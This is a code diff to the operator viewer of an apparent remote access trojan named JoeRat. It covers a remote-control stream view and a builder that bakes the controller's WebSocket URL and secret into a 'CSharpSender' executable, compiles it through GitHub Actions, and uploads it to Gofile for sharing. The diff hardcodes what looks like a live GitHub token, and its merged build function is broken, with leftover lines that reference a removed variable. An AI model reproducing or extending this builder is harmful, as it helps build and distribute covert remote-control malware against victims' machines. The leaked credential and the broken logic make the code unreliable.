@@ -35,8 +35,9 @@ class StreamLabel(QLabel):
         super().__init__(parent)
         self.setFocusPolicy(Qt.StrongFocus)
         self.setMinimumSize(1, 1)
-        self.setSizePolicy(QSizePolicy.Ignored, QSizePolicy.Ignored)
+        self.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)  # Changed from Ignored to Expanding
         self._original_pixmap = None
+        self.setAlignment(Qt.AlignCenter)  # Center the content
 
     def setPixmap(self, pixmap):
         self._original_pixmap = pixmap
@@ -46,7 +47,8 @@ class StreamLabel(QLabel):
             w, h = self.width(), self.height()
             if w > 0 and h > 0:
                 print(f"[DEBUG] StreamLabel.setPixmap: original={pixmap.width()}x{pixmap.height()}, label={w}x{h}")
-                super().setPixmap(pixmap.scaled(w, h, Qt.IgnoreAspectRatio, Qt.SmoothTransformation))
+                # Use KeepAspectRatio to show the full stream without cropping
+                super().setPixmap(pixmap.scaled(w, h, Qt.KeepAspectRatio, Qt.SmoothTransformation))
             else:
                 super().setPixmap(pixmap)
 
@@ -56,7 +58,8 @@ class StreamLabel(QLabel):
         if self._original_pixmap and not self._original_pixmap.isNull():
             w, h = self.width(), self.height()
             if w > 0 and h > 0:
-                super().setPixmap(self._original_pixmap.scaled(w, h, Qt.IgnoreAspectRatio, Qt.SmoothTransformation))
+                # Use KeepAspectRatio to show the full stream without cropping
+                super().setPixmap(self._original_pixmap.scaled(w, h, Qt.KeepAspectRatio, Qt.SmoothTransformation))
 
     def mousePressEvent(self, event):
         self.setFocus()
@@ -3075,6 +3078,9 @@ class ViewerWindow(QMainWindow):
         asyncio.ensure_future(self.send_ws({'type': 'select_sender', 'sender': machine_id}))
         self._animate_view_transition(2)  # Index 2 is the full view widget
         self._send_stream_quality_for_sender(machine_id)
+        
+        # Force the stream label to fill the full widget
+        QTimer.singleShot(200, self._force_full_view_stream_fill)
 
     def _on_machine_detail_click(self, item):
         actual_machine_id = item.data(Qt.UserRole)
@@ -3198,7 +3204,7 @@ class ViewerWindow(QMainWindow):
         
         # --- HARDCODED CREDENTIALS ---
         repo   = "Lonhaax/JoeRat"
-        pat    = "YOUR_GITHUB_TOKEN_HERE" # <--- Replace with real token
+        pat    = "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" # <--- Replace with real token
         # -----------------------------
 
         exe_name = getattr(self, 'gh_exe_name_input', None) and self.gh_exe_name_input.text().strip() or cfg.get('exe_name', 'CSharpSender').strip()
@@ -3206,7 +3212,7 @@ class ViewerWindow(QMainWindow):
         if hasattr(self, 'build_log_output'):
             self.build_log_output.clear()
 
-        if not pat or "github_pat_" not in pat:
+        if not pat or ("github_pat_" not in pat and "ghp_" not in pat):
              self.log_build_msg('❌ ERROR: Please insert the real GitHub PAT in viewer.py.')
              return
 
@@ -3241,7 +3247,7 @@ class ViewerWindow(QMainWindow):
             pass
 
     async def _trigger_github_build(self, repo: str, pat: str, exe_name: str):
-        """Create unique branch, commit config, wait for release, download, and upload to Gofile."""
+        """Update BuildConfig.cs and trigger GitHub Actions build."""
         import urllib.request, urllib.error, base64 as _b64, time, os, requests
 
         def _req(url, method='GET', body=None):
@@ -3252,12 +3258,16 @@ class ViewerWindow(QMainWindow):
             if body:
                 r.add_header('Content-Type', 'application/json')
             with urllib.request.urlopen(r, timeout=15) as resp:
-                return json.loads(resp.read())
+                response_data = resp.read()
+                if response_data:
+                    return json.loads(response_data.decode())
+                else:
+                    # Empty response is OK for some endpoints (like workflow dispatch)
+                    return {"status": "success", "message": "No content"}
 
         loop = asyncio.get_event_loop()
         try:
             timestamp = time.strftime('%Y%m%d-%H%M')
-            branch = f"build/{exe_name}-{timestamp}"
             
             self.log_build_msg(f' ℹ️  Fetching repository information...')
             # Fetch master branch SHA
@@ -3266,19 +3276,9 @@ class ViewerWindow(QMainWindow):
             )
             sha = main_ref['object']['sha']
             
-            self.log_build_msg(f'🌿 Creating isolated branch: {branch}...')
-            # Create new branch
-            await loop.run_in_executor(
-                None, lambda: _req(
-                    f'https://api.github.com/repos/{repo}/git/refs',
-                    method='POST',
-                    body=json.dumps({"ref": f"refs/heads/{branch}", "sha": sha}).encode()
-                )
-            )
-
-            # Build the new BuildConfig.cs
+            # Build the new BuildConfig.cs with correct namespace
             new_content = (
-                'namespace JoeRat;\n'
+                'namespace CSharpSender;\n'
                 'internal static class BuildConfig\n'
                 '{\n'
                 f'    public const string DefaultWsUrl  = "{self.ws_url}";\n'
@@ -3287,6 +3287,69 @@ class ViewerWindow(QMainWindow):
                 f'    public const string ExeName       = "{exe_name}";\n'
                 '}\n'
             )
+            encoded = _b64.b64encode(new_content.encode()).decode()
+
+            self.log_build_msg(f'📝 Updating BuildConfig.cs with new settings...')
+            # Update the file directly on master branch
+            file_path = 'csharpsender/CSharpSender/BuildConfig.cs'
+            api_file  = f'https://api.github.com/repos/{repo}/contents/{file_path}'
+            
+            # Get current file SHA
+            current = await loop.run_in_executor(
+                None, lambda: _req(f'{api_file}?ref=master')
+            )
+            current_sha = current.get('sha', '')
+
+            # Update the file
+            await loop.run_in_executor(
+                None, lambda: _req(
+                    api_file, method='PUT',
+                    body=json.dumps({
+                        'message': f'chore: build {exe_name} for room {self.room_id}',
+                        'content': encoded,
+                        'sha':     current_sha,
+                        'branch':  'master',
+                    }).encode()
+                )
+            )
+
+            self.log_build_msg('✅ Configuration updated successfully!')
+            self.log_build_msg('🚀 Triggering GitHub Actions workflow...')
+            
+            # Trigger workflow directly
+            try:
+                trigger_response = await loop.run_in_executor(
+                    None, lambda: _req(
+                        f'https://api.github.com/repos/{repo}/actions/workflows/build-sender.yml/dispatches',
+                        method='POST',
+                        body=json.dumps({
+                            'ref': 'master',
+                            'inputs': {
+                                'ws_url': self.ws_url,
+                                'room_id': self.room_id,
+                                'secret': self.secret,
+                                'exe_name': exe_name
+                            }
+                        }).encode()
+                    )
+                )
+                self.log_build_msg('✅ GitHub Actions triggered successfully!')
+                self.log_build_msg(f'   Response: {trigger_response}')
+            except Exception as trigger_error:
+                self.log_build_msg(f'⚠️ Workflow trigger may have failed: {str(trigger_error)}')
+                self.log_build_msg('⏳ Continuing to poll for build anyway...')
+            
+            self.log_build_msg('⏳ Waiting for build to complete...')
+
+            # Poll for workflow completion and download
+            await self._poll_and_download_release(repo, pat, exe_name)
+
+        except urllib.error.HTTPError as e:
+            body_txt = e.read().decode(errors='replace')[:300]
+            msg = f'GitHub error {e.code}: {body_txt}'
+            self.log_build_msg(f'❌ {msg}')
+        except Exception as e:
+            self.log_build_msg(f'❌ Error triggering build: {str(e)}')
             encoded = _b64.b64encode(new_content.encode()).decode()
 
             self.log_build_msg(f'📝 Committing new settings securely to {branch}...')
@@ -3314,7 +3377,7 @@ class ViewerWindow(QMainWindow):
             self.log_build_msg('✅ Code has been accepted on the server... Processing build...')
             self.log_build_msg('⏳ Waiting for executable to finish building. This usually takes a few minutes. Do not close this window or trigger another build until this one finishes.')
 
-            asyncio.ensure_future(self._poll_and_download_release(repo, pat, branch, exe_name))
+            asyncio.ensure_future(self._poll_and_download_release(repo, pat, exe_name))
 
         except urllib.error.HTTPError as e:
             body_txt = e.read().decode(errors='replace')[:300]
@@ -3323,7 +3386,8 @@ class ViewerWindow(QMainWindow):
         except Exception as e:
             self.log_build_msg(f'❌ Error triggering build: {str(e)}')
 
-    async def _poll_and_download_release(self, repo, pat, tag, exe_name):
+    async def _poll_and_download_release(self, repo, pat, exe_name):
+        """Poll GitHub Actions for build completion and download artifact."""
         import urllib.request, time, os, requests
         def _req(url):
             r = urllib.request.Request(url)
@@ -3334,141 +3398,321 @@ class ViewerWindow(QMainWindow):
                 return json.loads(resp.read())
         
         loop = asyncio.get_event_loop()
-        asset_url = None
+        
+        # Wait a bit for workflow to start
+        await asyncio.sleep(30)
+        
+        # Poll for workflow runs
         for i in range(40): # poll for 10 minutes
             await asyncio.sleep(15)
-            self.log_build_msg(f'   Checking server... (Attempt {i+1}/40) Do not close this window. You will not receive the file.')
+            self.log_build_msg(f'   Checking build status... (Attempt {i+1}/40)')
             try:
-                release = await loop.run_in_executor(
-                    None, lambda: _req(f'https://api.github.com/repos/{repo}/releases/tags/{tag}')
+                # Get latest workflow run
+                runs = await loop.run_in_executor(
+                    None, lambda: _req(f'https://api.github.com/repos/{repo}/actions/workflows/build-sender.yml/runs')
                 )
-                if release and release.get('assets'):
-                    asset_url = release['assets'][0]['url']
-                    self.log_build_msg(f'✅ Found compiled file on GitHub server!')
-                    break
-            except urllib.error.HTTPError as e:
-                pass
-            except Exception:
-                pass
                 
-        if not asset_url:
-            self.log_build_msg("❌ Build timeout. The server took too long to compile the file.")
-            QTimer.singleShot(0, lambda: self.show_warning("❌ Build timeout. Could not find release asset."))
-            return
-            
+                if runs and runs.get('workflow_runs'):
+                    latest_run = runs['workflow_runs'][0]  # Most recent run
+                    
+                    if latest_run.get('status') == 'completed':
+                        if latest_run.get('conclusion') == 'success':
+                            # Get artifacts
+                            run_id = latest_run['id']
+                            artifacts = await loop.run_in_executor(
+                                None, lambda: _req(f'https://api.github.com/repos/{repo}/actions/runs/{run_id}/artifacts')
+                            )
+                            
+                            if artifacts and artifacts.get('artifacts'):
+                                artifact = artifacts['artifacts'][0]
+                                self.log_build_msg(f'✅ Build completed! Found artifact: {artifact["name"]}')
+                                
+                                # Download artifact
+                                download_url = artifact['archive_download_url']
+                                await self._download_artifact(repo, pat, download_url, exe_name)
+                                return
+                            else:
+                                self.log_build_msg('❌ Build completed but no artifact found')
+                                return
+                        else:
+                            self.log_build_msg('❌ Build failed')
+                            return
+                    else:
+                        status = latest_run.get('status', 'unknown')
+                        self.log_build_msg(f'   Build status: {status}')
+                        
+                else:
+                    self.log_build_msg('   No workflow runs found')
+                    
+            except Exception as e:
+                self.log_build_msg(f'   Error checking status: {str(e)}')
+                continue
+                
+        self.log_build_msg('⏰ Build timeout - please check GitHub Actions manually')
+    
+    async def _download_artifact(self, repo, pat, download_url, exe_name):
+        """Download and extract the build artifact."""
+        import urllib.request, zipfile, os, requests
+        
         try:
-            self.log_build_msg(f"⬇️ Downloading {exe_name}.exe to your machine...")
+            self.log_build_msg(f'⬇️ Downloading {exe_name} build...')
+            
+            # Download artifact using requests (better handling of auth)
+            headers = {
+                'Authorization': f'Bearer {pat}',
+                'Accept': 'application/vnd.github+json',
+                'X-GitHub-Api-Version': '2022-11-28'
+            }
             
             user_downloads = os.path.join(os.path.expanduser('~'), 'Downloads')
-            save_path = os.path.normpath(os.path.join(user_downloads, f"{exe_name}.exe"))
+            zip_path = os.path.join(user_downloads, f'{exe_name}_build.zip')
             
-            def _download():
-                r = urllib.request.Request(asset_url)
-                r.add_header('Authorization', f'Bearer {pat}')
-                r.add_header('Accept', 'application/octet-stream')
-                r.add_header('X-GitHub-Api-Version', '2022-11-28')
-                with urllib.request.urlopen(r, timeout=60) as resp, open(save_path, 'wb') as f:
-                    f.write(resp.read())
+            response = requests.get(download_url, headers=headers, timeout=60)
+            response.raise_for_status()
             
-            await loop.run_in_executor(None, _download)
-            self.log_build_msg(f"✅ Download complete! Saved to: {save_path}")
-            self.log_build_msg(f"☁️ Uploading to Gofile... please wait.")
+            with open(zip_path, 'wb') as f:
+                f.write(response.content)
             
-            def _upload_gofile():
-                srv_resp = requests.get("https://api.gofile.io/servers").json()
-                server = srv_resp['data']['servers'][0]['name']
-                with open(save_path, 'rb') as f:
-                    upload_resp = requests.post(f"https://{server}.gofile.io/contents/uploadfile", files={'file': f}).json()
-                return upload_resp['data']['downloadPage']
+            # Extract zip
+            self.log_build_msg('📦 Extracting executable...')
+            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
+                zip_ref.extractall(user_downloads)
+            
+            # Find the exe file
+            exe_path = None
+            for root, dirs, files in os.walk(user_downloads):
+                for file in files:
+                    if file.endswith('.exe') and exe_name in file:
+                        exe_path = os.path.join(root, file)
+                        break
+                if exe_path:
+                    break
+            
+            if exe_path and os.path.exists(exe_path):
+                size_mb = os.path.getsize(exe_path) / (1024 * 1024)
+                self.log_build_msg(f'✅ Build complete! {exe_name}.exe ({size_mb:.1f} MB)')
+                self.log_build_msg(f'📁 Location: {exe_path}')
                 
-            share_link = await loop.run_in_executor(None, _upload_gofile)
-            
-            self.log_build_msg(f"🎉 Build Flow Complete!")
-            self.log_build_msg(f"🔗 Gofile Link: {share_link}")
-            
-            # Show the final dialog summary
-            QTimer.singleShot(0, lambda: self.show_warning(f"🎉 Build Complete!\n\nDownloaded to:\n{save_path}\n\nGofile Link:\n{share_link}"))
-            
+                # Upload to Gofile
+                self.log_build_msg('☁️ Uploading to Gofile... please wait.')
+                try:
+                    gofile_link = await self._upload_to_gofile(exe_path)
+                    if gofile_link:
+                        self.log_build_msg(f'🔗 Gofile Link: {gofile_link}')
+                        self.show_warning(f'✅ Build Complete!\n\n{exe_name}.exe downloaded to:\n{exe_path}\n\n🔗 Gofile Link:\n{gofile_link}')
+                    else:
+                        self.show_warning(f'✅ Build Complete!\n\n{exe_name}.exe downloaded to:\n{exe_path}\n\n⚠️ Gofile upload failed')
+                except Exception as gofile_error:
+                    self.log_build_msg(f'⚠️ Gofile upload failed: {str(gofile_error)}')
+                    self.show_warning(f'✅ Build Complete!\n\n{exe_name}.exe downloaded to:\n{exe_path}\n\n⚠️ Gofile upload failed')
+                
+                # Clean up zip
+                try:
+                    os.remove(zip_path)
+                except:
+                    pass
+            else:
+                self.log_build_msg('❌ Executable not found in artifact')
+                
         except Exception as e:
-            self.log_build_msg(f"❌ Post-build failed: {str(e)}")
+            self.log_build_msg(f'❌ Download failed: {str(e)}')
+            
+            # Fallback: try to get artifact download URL with proper redirect
+            try:
+                self.log_build_msg('🔄 Trying alternative download method...')
+                import urllib.request
+                
+                # Get the artifact with proper redirect handling
+                req = urllib.request.Request(download_url)
+                req.add_header('Authorization', f'Bearer {pat}')
+                req.add_header('Accept', 'application/octet-stream')
+                
+                with urllib.request.urlopen(req, timeout=60) as resp:
+                    if resp.status == 302:  # Redirect
+                        redirect_url = resp.headers.get('Location')
+                        if redirect_url:
+                            self.log_build_msg('🔄 Following redirect to download...')
+                            with urllib.request.urlopen(redirect_url, timeout=60) as redirect_resp:
+                                with open(zip_path, 'wb') as f:
+                                    f.write(redirect_resp.read())
+                                
+                                # Extract and find exe
+                                with zipfile.ZipFile(zip_path, 'r') as zip_ref:
+                                    zip_ref.extractall(user_downloads)
+                                
+                                for root, dirs, files in os.walk(user_downloads):
+                                    for file in files:
+                                        if file.endswith('.exe') and exe_name in file:
+                                            exe_path = os.path.join(root, file)
+                                            break
+                                    if exe_path:
+                                        break
+                                
+                                if exe_path and os.path.exists(exe_path):
+                                    size_mb = os.path.getsize(exe_path) / (1024 * 1024)
+                                    self.log_build_msg(f'✅ Build complete! {exe_name}.exe ({size_mb:.1f} MB)')
+                                    self.log_build_msg(f'📁 Location: {exe_path}')
+                                    
+                                    # Upload to Gofile
+                                    self.log_build_msg('☁️ Uploading to Gofile... please wait.')
+                                    try:
+                                        gofile_link = await self._upload_to_gofile(exe_path)
+                                        if gofile_link:
+                                            self.log_build_msg(f'🔗 Gofile Link: {gofile_link}')
+                                            self.show_warning(f'✅ Build Complete!\n\n{exe_name}.exe downloaded to:\n{exe_path}\n\n🔗 Gofile Link:\n{gofile_link}')
+                                        else:
+                                            self.show_warning(f'✅ Build Complete!\n\n{exe_name}.exe downloaded to:\n{exe_path}\n\n⚠️ Gofile upload failed')
+                                    except Exception as gofile_error:
+                                        self.log_build_msg(f'⚠️ Gofile upload failed: {str(gofile_error)}')
+                                        self.show_warning(f'✅ Build Complete!\n\n{exe_name}.exe downloaded to:\n{exe_path}\n\n⚠️ Gofile upload failed')
+                                else:
+                                    self.log_build_msg('❌ Executable not found in artifact')
+            except Exception as fallback_error:
+                self.log_build_msg(f'❌ Fallback download also failed: {str(fallback_error)}')
 
-
+    async def _upload_to_gofile(self, file_path):
+        """Upload file to Gofile and return download link."""
+        import requests
+        import asyncio
+        
+        try:
+            # Get best server
+            self.log_build_msg('🔍 Finding best Gofile server...')
+            server_response = requests.get("https://api.gofile.io/servers", timeout=10)
+            server_response.raise_for_status()
+            server_data = server_response.json()
+            
+            if server_data.get('status') != 'ok' or not server_data.get('data', {}).get('servers'):
+                self.log_build_msg('❌ Failed to get Gofile server info')
+                return None
+                
+            server = server_data['data']['servers'][0]['name']
+            self.log_build_msg(f'📡 Using server: {server}')
+            
+            # Upload file
+            upload_url = f"https://{server}.gofile.io/contents/uploadfile"
+            
+            def upload_file():
+                with open(file_path, 'rb') as f:
+                    files = {'file': (os.path.basename(file_path), f, 'application/octet-stream')}
+                    response = requests.post(upload_url, files=files, timeout=300)
+                    return response.json()
+            
+            self.log_build_msg('⬆️ Uploading file...')
+            result = await asyncio.get_event_loop().run_in_executor(None, upload_file)
+            
+            if result.get('status') == 'ok' and result.get('data', {}).get('downloadPage'):
+                download_link = result['data']['downloadPage']
+                self.log_build_msg(f'✅ Upload successful!')
+                return download_link
+            else:
+                error_msg = result.get('data', {}).get('message', 'Unknown error')
+                self.log_build_msg(f'❌ Upload failed: {error_msg}')
+                return None
+                
+        except requests.exceptions.RequestException as e:
+            self.log_build_msg(f'❌ Network error during upload: {str(e)}')
+            return None
+        except Exception as e:
+            self.log_build_msg(f'❌ Upload error: {str(e)}')
+            return None
 
     def get_machine_id(self):
         return platform.node()
 
     def toggle_fullscreen(self):
         if self.fullscreen_btn.isChecked():
-            # Create a new StreamLabel for fullscreen display
-            self.fullscreen_stream_label = StreamLabel(self)
-            self.fullscreen_stream_label.setAlignment(Qt.AlignCenter)
-            self.fullscreen_stream_label.setFocusPolicy(Qt.StrongFocus)
-            self.fullscreen_stream_label.setMouseTracking(True)
-            # Copy pixmap from original stream_label
-            pixmap = self.stream_label.pixmap()
-            if pixmap:
-                self.fullscreen_stream_label.setPixmap(pixmap)
-            self.fullscreen_stream_label.setText(self.stream_label.text())
-            # Connect event handlers for interactivity
-            self.fullscreen_stream_label.mousePressEvent = self.handle_mouse_press
-            self.fullscreen_stream_label.mouseReleaseEvent = self.handle_mouse_release
-            self.fullscreen_stream_label.mouseMoveEvent = self.handle_mouse_move
-            self.fullscreen_stream_label.wheelEvent = self.handle_mouse_wheel
-            self.fullscreen_stream_label.keyPressEvent = self.handle_key_press
-            self.fullscreen_stream_label.keyReleaseEvent = self.handle_key_release
-            self.fullscreen_stream_label.enterEvent = self.handle_stream_enter
-            # Also ensure original stream_label always has handlers and mouse tracking
-            self.stream_label.setMouseTracking(True)
-            self.stream_label.mousePressEvent = self.handle_mouse_press
-            self.stream_label.mouseReleaseEvent = self.handle_mouse_release
-            self.stream_label.mouseMoveEvent = self.handle_mouse_move
-            self.stream_label.wheelEvent = self.handle_mouse_wheel
-            self.stream_label.keyPressEvent = self.handle_key_press
-            self.stream_label.keyReleaseEvent = self.handle_key_release
-            self.stream_label.enterEvent = self.handle_stream_enter
-            fullscreen_stack = QStackedWidget()
+            # Store current state
+            self._original_central_widget = self.central_widget
+            self._original_window_flags = self.windowFlags()
+            self._original_geometry = self.geometry()
+            
+            # Create a simple QWidget for fullscreen
             fullscreen_widget = QWidget()
-            layout = QGridLayout()
-            layout.setContentsMargins(0, 0, 0, 0)
-            # Set fullscreen background to black
-            fullscreen_widget.setStyleSheet('background-color: #000;')
+            fullscreen_widget.setStyleSheet('background-color: black;')
             
-            # The StreamLabel natively handles scaling with Qt.KeepAspectRatio and SmoothTransformation in its resizeEvent.
-            # Do NOT use setScaledContents(True) as it forces ignorant 100% width/height stretching.
-            layout.addWidget(self.fullscreen_stream_label, 0, 0)
+            # Create the StreamLabel directly without layout
+            self.fullscreen_stream_label = StreamLabel(fullscreen_widget)
+            self.fullscreen_stream_label.setParent(fullscreen_widget)
             
-            # Show fullscreen button as floating overlay in fullscreen mode (QGridLayout allows z-stacking in the same cell)
-            self.fullscreen_btn.setVisible(True)
-            self.fullscreen_btn.setText('  Exit Fullscreen')
-            self.fullscreen_btn.setStyleSheet('background: rgba(30, 30, 30, 180); color: #fff; border-radius: 8px; padding: 10px; font-size: 16px;')
-            layout.addWidget(self.fullscreen_btn, 0, 0, Qt.AlignTop | Qt.AlignRight)
+            # Copy current content
+            if self.stream_label.pixmap():
+                self.fullscreen_stream_label.setPixmap(self.stream_label.pixmap())
+            else:
+                self.fullscreen_stream_label.setText(self.stream_label.text())
             
-            fullscreen_widget.setLayout(layout)
-            fullscreen_stack.addWidget(self.central_widget)
-            fullscreen_stack.addWidget(fullscreen_widget)
-            self.setCentralWidget(fullscreen_stack)
-            fullscreen_stack.setCurrentIndex(1)
-            self.fullscreen_stream_label.setFocus()
+            # Create exit button
+            exit_btn = QPushButton(' Exit Fullscreen ', fullscreen_widget)
+            exit_btn.setStyleSheet('background: rgba(30, 30, 30, 180); color: white; border-radius: 8px; padding: 8px; font-size: 14px; border: none;')
+            exit_btn.clicked.connect(lambda: self.fullscreen_btn.setChecked(False))
+            
+            # Set as central widget
+            self.setCentralWidget(fullscreen_widget)
+            
+            # Make window frameless and fullscreen
+            self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
             self.showFullScreen()
-            self._fullscreen_stack = fullscreen_stack
+            
+            # Position widgets after window is shown
+            QTimer.singleShot(100, lambda: self._position_fullscreen_widgets(fullscreen_widget, exit_btn))
+            
         else:
-            # Restore original layout and widgets
+            # Restore original state
+            self.setWindowFlags(self._original_window_flags)
             self.showNormal()
-            # Recreate main UI tabs and layout
-            self.setup_ui()
-            self.setCentralWidget(self.central_widget)
-            self.fullscreen_btn.setText('Fullscreen')
-            self.fullscreen_btn.setVisible(True)
-            # Remove reference to fullscreen_stack and fullscreen_stream_label
-            if hasattr(self, '_fullscreen_stack'):
-                self._fullscreen_stack = None
+            self.setGeometry(self._original_geometry)
+            
+            # Restore original central widget
+            if hasattr(self, '_original_central_widget'):
+                self.setCentralWidget(self._original_central_widget)
+                self.central_widget = self._original_central_widget
+            
+            # Cleanup
             if hasattr(self, 'fullscreen_stream_label'):
                 self.fullscreen_stream_label.deleteLater()
                 self.fullscreen_stream_label = None
-            
-            # Force reconnection to sender after UI is restored
-            if self.selected_sender:
-                QTimer.singleShot(1000, self._reconnect_to_sender)
+    
+    def _position_fullscreen_widgets(self, parent_widget, exit_btn):
+        """Position widgets to fill the entire screen"""
+        # Get actual window size
+        window_size = parent_widget.size()
+        width = window_size.width()
+        height = window_size.height()
+        
+        print(f"[DEBUG] Fullscreen window size: {width}x{height}")
+        
+        # Make stream label fill entire window
+        self.fullscreen_stream_label.setGeometry(0, 0, width, height)
+        
+        # Position exit button in top-right corner
+        btn_width = 120
+        btn_height = 40
+        exit_btn.setGeometry(width - btn_width - 20, 20, btn_width, btn_height)
+        
+        # Force pixmap update
+        if self.fullscreen_stream_label._original_pixmap:
+            self.fullscreen_stream_label.setPixmap(self.fullscreen_stream_label._original_pixmap)
+    
+    def _force_full_view_stream_fill(self):
+        """Force the stream label to fill the full view widget"""
+        if hasattr(self, 'stream_label') and self.stream_label:
+            # Get the parent widget (monitor_full_widget)
+            parent = self.stream_label.parent()
+            if parent:
+                # Get the available space (excluding margins)
+                parent_rect = parent.rect()
+                # Account for the layout margins (8px on each side) and button layouts
+                available_width = parent_rect.width() - 16  # 8px left + 8px right margins
+                available_height = parent_rect.height() - 80  # Approximate space for top/bottom button layouts
+                
+                print(f"[DEBUG] Full view available space: {available_width}x{available_height}")
+                
+                # Force the stream label to fill the available space
+                self.stream_label.setGeometry(8, 50, available_width, available_height)
+                
+                # Update pixmap if exists
+                if self.stream_label._original_pixmap:
+                    self.stream_label.setPixmap(self.stream_label._original_pixmap)
     
     def _reconnect_to_sender(self):
         """Reconnect to the selected sender after fullscreen exit"""
